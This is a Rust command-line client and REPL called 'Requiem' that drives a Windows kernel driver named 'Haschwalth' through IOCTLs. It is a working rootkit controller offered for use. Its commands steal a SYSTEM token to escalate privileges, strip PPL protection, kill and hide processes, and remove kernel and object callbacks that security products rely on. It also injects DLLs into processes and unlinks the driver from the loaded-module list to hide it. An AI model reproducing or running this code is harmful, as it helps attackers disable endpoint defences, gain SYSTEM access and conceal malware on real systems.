use clap::{CommandFactory, Parser, Subcommand};
use clap_complete::{generate, Shell};
use rustyline::completion::{Completer, Pair};
use rustyline::error::ReadlineError;
use rustyline::highlight::Highlighter;
use rustyline::hint::Hinter;
use rustyline::validate::Validator;
use rustyline::{Context, Editor, Helper};
use std::ffi::{CString, c_void};
use std::mem::size_of;
use std::process::exit;
use windows::Win32::Foundation::*;
use windows::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ,
    FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::IO::*;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::core::*;

const DRIVER_NAME: &str = r"\\.\Haschwalth";
const HISTORY_FILE: &str = "requiem_history.txt";

const IOCTL_REQUIEM_TEST: u32 = 0x222004;
const IOCTL_KILL_PROCESS: u32 = 0x222008;
const IOCTL_HIDE_PROCESS: u32 = 0x222010;
const IOCTL_STRIP_PPL: u32 = 0x22200C;
const IOCTL_REQUIEM_TOKEN_STEAL: u32 = 0x222014;
const IOCTL_REQUIEM_ENUM_CALLBACKS: u32 = 0x222018;
const IOCTL_REQUIEM_REMOVE_CALLBACK: u32 = 0x22201C;
const IOCTL_REQUIEM_INJECT_DLL: u32 = 0x222020;
const IOCTL_REQUIEM_PROTECT_PROCESS: u32 = 0x222024;
const IOCTL_REQUIEM_ENUM_OB_CALLBACKS: u32 = 0x222028;
const IOCTL_REQUIEM_REMOVE_OB_CALLBACK: u32 = 0x22202C;
const IOCTL_REQUIEM_UNLINK_DRIVER: u32 = 0x222030;

const REPL_BUILTINS: &[&str] = &["help", "exit", "quit", "clear", "cls", "?"];

#[derive(Parser, Debug)]
#[command(
    name = "Requiem",
    version = "0.1.0",
    about = "Kernel interaction client",
    long_about = None
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    #[command(about = "Send a test message to the driver")]
    Message { text: String },

    #[command(about = "Kill a process by PID")]
    Kill { pid: u64 },

    #[command(about = "Remove PPL protection from a process")]
    StripPPL { pid: u64 },

    #[command(about = "Steal the token from the system and attach it to your process by PID <pid 1337> ")]
    Steal { pid: u64 },

    #[command(about = "Hide a process")]
    Hide { pid: u64 },

    #[command(about = "Apply PS_PROTECTED_SYSTEM to a process by PID")]
    Protect { pid: u64 },

    #[command(about = "Enumerate kernel callbacks (0=Process, 1=Thread)")]
    EnumCallbacks { cb_type: u32 },

    #[command(about = "Remove a callback")]
    RemoveCallback { cb_type: u32, index: u32 },

    #[command(about = "Inject DLL into process <pid> <path> ")]
    Inject { pid: u64, path: String },

    #[command(about = "Enumerate object callbacks (0=Process, 1=Thread)")]
    EnumObCallbacks { object_type: u32 },

    #[command(about = "Disable an object callback by index <OB_TYPE> <index>")]
    RemoveObCallback { object_type: u32, index: u32 },

    #[command(about = "Unlink driver from PsLoadedModuleList")]
    UnlinkDriver,

    #[command(about = "Generate shell completion script (bash|zsh|fish|powershell|elvish)")]
    Completions { shell: Shell },
}

#[repr(C)]
struct PidRequest {
    pid: u64,
}

#[repr(C)]
struct CallbackEnumRequest {
    cb_type: u32,
    max_entries: u32,
}

#[repr(C)]
struct CallbackEntry {
    index: u32,
    routine: u64,
    module_base: u64,
    module_name: [u16; 64],
}

#[repr(C)]
struct CallbackEnumResponse {
    count: u32,
    entries: [CallbackEntry; 64],
}

#[repr(C)]
struct CallbackRemoveRequest {
    cb_type: u32,
    index: u32,
}

#[repr(C)]
struct InjectDllRequestExt {
    pid: u64,
    load_library_addr: u64,
    dll_path: [u8; 260],
}

#[repr(C)]
struct ObCallbackEnumRequest {
    object_type: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ObCallbackEntry {
    index: u32,
    pre_operation: u64,
    post_operation: u64,
    parent: u64,
    list_entry: u64,
}

#[repr(C)]
struct ObCallbackEnumResponse {
    count: u32,
    entries: [ObCallbackEntry; 32],
}

#[repr(C)]
struct ObCallbackRemoveRequest {
    object_type: u32,
    index: u32,
}

struct Device {
    handle: HANDLE,
}

impl Device {
    fn new(driver_name: &str) -> Result<Self> {
        let device_name_c =
            CString::new(driver_name).expect("Failed to convert driver name to CString");

        let handle = unsafe {
            CreateFileA(
                PCSTR(device_name_c.as_ptr() as _),
                (FILE_GENERIC_READ | FILE_GENERIC_WRITE).0,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )?
        };

        if handle == INVALID_HANDLE_VALUE {
            println!("[!] Failed to open device. {}", driver_name);
            return Err(Error::from_win32());
        }

        Ok(Device { handle })
    }

    fn send_ioctl(
        &self,
        ioctl: u32,
        input_buffer: *const c_void,
        input_buffer_size: u32,
    ) -> Result<u32> {
        let mut bytes_returned = 0;
        unsafe {
            DeviceIoControl(
                self.handle,
                ioctl,
                Some(input_buffer),
                input_buffer_size,
                None,
                0,
                Some(&mut bytes_returned),
                None,
            )?;
        }
        Ok(bytes_returned)
    }

    fn send_ioctl_out(
        &self,
        ioctl: u32,
        input_buffer: *const c_void,
        input_size: u32,
        output_buffer: *mut c_void,
        output_size: u32,
    ) -> Result<u32> {
        let mut bytes_returned = 0;
        unsafe {
            DeviceIoControl(
                self.handle,
                ioctl,
                Some(input_buffer),
                input_size,
                Some(output_buffer),
                output_size,
                Some(&mut bytes_returned),
                None,
            )?;
        }
        Ok(bytes_returned)
    }

    fn send_struct<T>(&self, ioctl: u32, data: &T) -> Result<u32> {
        self.send_ioctl(ioctl, data as *const _ as *const c_void, size_of::<T>() as u32)
    }

    fn send_pid_request(&self, ioctl: u32, pid: u64) -> Result<u32> {
        self.send_struct(ioctl, &PidRequest { pid })
    }

    fn send_message_request(&self, ioctl: u32, message: String) -> Result<u32> {
        let input_buffer = CString::new(message).expect("Failed to convert message to CString");
        self.send_ioctl(
            ioctl,
            input_buffer.as_ptr() as *const c_void,
            input_buffer.as_bytes_with_nul().len() as u32,
        )
    }
}

impl Drop for Device {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.handle);
        }
        println!("[!] Device handle closed.");
    }
}

fn run_command(cmd: Commands, device: &Device) -> Result<u32> {
    match cmd {
        Commands::Message { text } => {
            println!("[+] Sending message: {:?}", text);
            device.send_message_request(IOCTL_REQUIEM_TEST, text)
        }
        Commands::Kill { pid } => {
            println!("[+] Killing process: {}", pid);
            println!("[+] Check the process with task manager or DebugView");
            device.send_pid_request(IOCTL_KILL_PROCESS, pid)
        }
        Commands::StripPPL { pid } => {
            println!("[+] Stripping PPL Protection: {}", pid);
            println!("[+] Patching PPL Protection to {} process", pid);
            device.send_pid_request(IOCTL_STRIP_PPL, pid)
        }
        Commands::Hide { pid } => {
            println!("[+] Hiding process: {}", pid);
            println!("[+] Process hidden from tasklist/Process Manager");
            device.send_pid_request(IOCTL_HIDE_PROCESS, pid)
        }
        Commands::Steal { pid } => {
            println!("[+] Stealing token from SYSTEM process: {}", pid);
            println!("[+] Token stolen from SYSTEM process");
            println!("[+] Now u`re SYSTEM. Enjoy ^_+");
            device.send_pid_request(IOCTL_REQUIEM_TOKEN_STEAL, pid)
        }
        Commands::Protect { pid } => {
            println!("[+] Applying PS_PROTECTED_SYSTEM (Type=Protected, Signer=WinSystem) to pid {}", pid);
            device.send_pid_request(IOCTL_REQUIEM_PROTECT_PROCESS, pid)
        }
        Commands::EnumCallbacks { cb_type } => {
            let req = CallbackEnumRequest { cb_type, max_entries: 64 };
            let mut resp: CallbackEnumResponse = unsafe { core::mem::zeroed() };

            let result = device.send_ioctl_out(
                IOCTL_REQUIEM_ENUM_CALLBACKS,
                &req as *const _ as _,
                size_of::<CallbackEnumRequest>() as u32,
                &mut resp as *mut _ as _,
                size_of::<CallbackEnumResponse>() as u32,
            );

            if result.is_ok() {
                for i in 0..resp.count as usize {
                    let name = String::from_utf16_lossy(&resp.entries[i].module_name)
                        .trim_matches(char::from(0))
                        .to_string();

                    println!(
                        "[{}] Routine: 0x{:X} | Module: {}",
                        resp.entries[i].index, resp.entries[i].routine, name
                    );
                }
            }
            result
        }
        Commands::RemoveCallback { cb_type, index } => {
            println!("[+] Removing callback: {}", cb_type);
            device.send_struct(
                IOCTL_REQUIEM_REMOVE_CALLBACK,
                &CallbackRemoveRequest { cb_type, index },
            )
        }
        Commands::Inject { pid, path } => {
            let h_kernel32 = unsafe { GetModuleHandleA(s!("kernel32.dll")).unwrap() };
            let proc_addr = unsafe { GetProcAddress(h_kernel32, s!("LoadLibraryA")).unwrap() };

            let mut req = InjectDllRequestExt {
                pid,
                load_library_addr: proc_addr as u64,
                dll_path: [0; 260],
            };

            println!("[+] Inject DLL: {:?}", path);

            let bytes = path.as_bytes();
            req.dll_path[..bytes.len()].copy_from_slice(bytes);

            device.send_struct(IOCTL_REQUIEM_INJECT_DLL, &req)
        }
        Commands::EnumObCallbacks { object_type } => {
            let kind = match object_type {
                0 => "Process",
                1 => "Thread",
                _ => "Unknown",
            };
            println!("[+] Enumerating OB callbacks for {} type", kind);

            let req = ObCallbackEnumRequest { object_type };
            let mut resp: ObCallbackEnumResponse = unsafe { core::mem::zeroed() };

            let result = device.send_ioctl_out(
                IOCTL_REQUIEM_ENUM_OB_CALLBACKS,
                &req as *const _ as _,
                size_of::<ObCallbackEnumRequest>() as u32,
                &mut resp as *mut _ as _,
                size_of::<ObCallbackEnumResponse>() as u32,
            );

            if result.is_ok() {
                println!("[+] Found {} OB callback(s)", resp.count);
                for i in 0..resp.count as usize {
                    let e = &resp.entries[i];
                    println!(
                        "[{}] Pre: 0x{:X} | Post: 0x{:X} | Parent: 0x{:X}",
                        e.index, e.pre_operation, e.post_operation, e.parent
                    );
                }
            }
            result
        }
        Commands::RemoveObCallback { object_type, index } => {
            println!("[+] Disabling OB callback type={} index={}", object_type, index);
            device.send_struct(
                IOCTL_REQUIEM_REMOVE_OB_CALLBACK,
                &ObCallbackRemoveRequest { object_type, index },
            )
        }
        Commands::UnlinkDriver => {
            println!("[+] Unlinking driver from PsLoadedModuleList");
            println!("[!] Driver will become invisible to module enumeration");
            device.send_ioctl(IOCTL_REQUIEM_UNLINK_DRIVER, std::ptr::null(), 0)
        }
        Commands::Completions { shell } => {
            let mut cmd = Cli::command();
            let bin_name = cmd.get_name().to_string();
            generate(shell, &mut cmd, bin_name, &mut std::io::stdout());
            Ok(0)
        }
    }
}

struct RequiemHelper {
    candidates: Vec<String>,
}

impl RequiemHelper {
    fn new() -> Self {
        let cmd = Cli::command();
        let mut candidates: Vec<String> = cmd
            .get_subcommands()
            .map(|s| s.get_name().to_string())
            .collect();
        candidates.extend(REPL_BUILTINS.iter().map(|s| s.to_string()));
        candidates.sort();
        candidates.dedup();
        Self { candidates }
    }
}

impl Completer for RequiemHelper {
    type Candidate = Pair;

    fn complete(
        &self,
        line: &str,
        pos: usize,
        _ctx: &Context<'_>,
    ) -> rustyline::Result<(usize, Vec<Pair>)> {
        let line_before = &line[..pos];

        let word_start = line_before
            .rfind(|c: char| c.is_whitespace())
            .map(|i| i + 1)
            .unwrap_or(0);

        let prefix = &line_before[word_start..];

        let before_word = line_before[..word_start].trim();
        if !before_word.is_empty() {
            return Ok((pos, Vec::new()));
        }

        let pairs: Vec<Pair> = self
            .candidates
            .iter()
            .filter(|c| c.starts_with(prefix))
            .map(|c| Pair {
                display: c.clone(),
                replacement: c.clone(),
            })
            .collect();

        Ok((word_start, pairs))
    }
}

impl Hinter for RequiemHelper {
    type Hint = String;
}
impl Highlighter for RequiemHelper {}
impl Validator for RequiemHelper {}
impl Helper for RequiemHelper {}

fn split_args(line: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;

    for c in line.chars() {
        match c {
            '"' => in_quotes = !in_quotes,
            ' ' | '\t' if !in_quotes => {
                if !current.is_empty() {
                    args.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        args.push(current);
    }
    args
}

fn print_banner() {
    println!(r"  ____                             _                ");
    println!(r" |  _ \ ___  __ _ _   _ _  ___ _ __ ___             ");
    println!(r" | |_) / _ \/ _` | | | | |/ _ \ '_ ` _ \            ");
    println!(r" |  _ <  __/ (_| | |_| | |  __/ | | | | |           ");
    println!(r" |_| \_\___|\__, |\__,_|_|\___|_| |_| |_|           ");
    println!(r"               |_|                                  ");
    println!("[i] TAB to complete, arrows for history, 'help' for commands\n");
}

fn run_repl(device: &Device) {
    print_banner();

    let mut rl: Editor<RequiemHelper, _> = match Editor::new() {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] Failed to init readline: {}", e);
            return;
        }
    };
    rl.set_helper(Some(RequiemHelper::new()));
    let _ = rl.load_history(HISTORY_FILE);

    loop {
        match rl.readline("Requiem # ") {
            Ok(line) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(trimmed);

                match trimmed {
                    "exit" | "quit" => break,
                    "cls" | "clear" => {
                        let _ = std::process::Command::new("cmd")
                            .args(["/C", "cls"])
                            .status();
                        continue;
                    }
                    "help" | "?" => {
                        let _ = Cli::command().print_help();
                        println!();
                        continue;
                    }
                    _ => {}
                }

                let mut argv = vec!["requiem".to_string()];
                argv.extend(split_args(trimmed));

                match Cli::try_parse_from(&argv) {
                    Ok(cli) => match run_command(cli.command, device) {
                        Ok(bytes) => println!("[+] Operation successful. Bytes returned {}", bytes),
                        Err(e) => println!("[-] IOCTL Error: {}", e),
                    },
                    Err(e) => {
                        let _ = e.print();
                    }
                }
                println!();
            }
            Err(ReadlineError::Interrupted) => {
                continue;
            }
            Err(ReadlineError::Eof) => {
                println!();
                break;
            }
            Err(e) => {
                eprintln!("[-] Readline error: {}", e);
                break;
            }
        }
    }

    let _ = rl.save_history(HISTORY_FILE);
}

fn main() {
    let argv: Vec<String> = std::env::args().collect();
    if argv.len() >= 2 && argv[1].eq_ignore_ascii_case("completions") {
        match Cli::try_parse() {
            Ok(cli) => {
                if let Commands::Completions { shell } = cli.command {
                    let mut cmd = Cli::command();
                    let bin_name = cmd.get_name().to_string();
                    generate(shell, &mut cmd, bin_name, &mut std::io::stdout());
                    return;
                }
            }
            Err(e) => {
                print!("{}", e);
                exit(2);
            }
        }
    }

    let device = Device::new(DRIVER_NAME).unwrap_or_else(|e| {
        eprintln!("[!] Cannot establish a handle to driver, verify if Haschwalth is running.");
        eprintln!("[!] Error creating device: {}", e);
        exit(1);
    });

    if argv.len() <= 1 {
        run_repl(&device);
        return;
    }

    let cli = Cli::parse();
    match run_command(cli.command, &device) {
        Ok(bytes) => println!("[+] Operation successful. Bytes returned {}", bytes),
        Err(e) => println!("[-] IOCTL Error: {}", e),
    }
}
